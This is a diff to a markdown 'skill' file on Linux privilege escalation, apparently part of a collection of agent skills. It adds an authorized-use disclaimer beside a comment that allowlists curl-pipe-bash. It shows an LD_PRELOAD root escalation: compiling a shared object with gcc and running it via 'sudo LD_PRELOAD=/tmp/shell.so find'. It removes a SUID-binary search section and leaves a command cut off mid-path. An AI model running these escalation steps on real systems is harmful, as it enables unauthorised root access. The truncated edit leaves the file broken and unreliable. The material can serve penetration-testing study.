@@ -8,6 +8,8 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linu
 ---
 
 
+> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
+
 <!-- security-allowlist: curl-pipe-bash -->
 
 # Linux Privilege Escalation
@@ -260,13 +262,4 @@ void _init() {
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
 # Execute with sudo
-sudo LD_PRELOAD=/tmp/shell.so find
-```
-
-### Phase 5: SUID Binary Exploitation
-
-#### Find SUID Binaries
-
-```bash
-find / -type f -perm -04000 -ls 2>/dev/null
-find /
+sudo LD_PRELOAD=/tm
